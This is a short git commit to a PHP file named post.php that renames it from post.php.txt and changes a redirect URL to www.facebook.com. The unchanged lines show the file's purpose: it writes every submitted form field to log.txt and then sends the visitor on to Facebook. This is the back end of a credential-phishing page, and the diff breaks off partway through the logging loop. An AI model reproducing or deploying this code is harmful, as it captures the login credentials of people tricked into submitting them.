568d84be653b7f83d6a04366e36e5bfc4aea89dc
anilstha <anilshrestha711@gmail.com>
2020-03-08 10:20:18 -0700

    Update and rename post.php.txt to post.php

--- post.php
+++ post.php
@@ -1,5 +1,5 @@
 <?php
-header ('Location: https://facebook.com');
+header ('Location: https://www.facebook.com');
 $handle = fopen("log.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
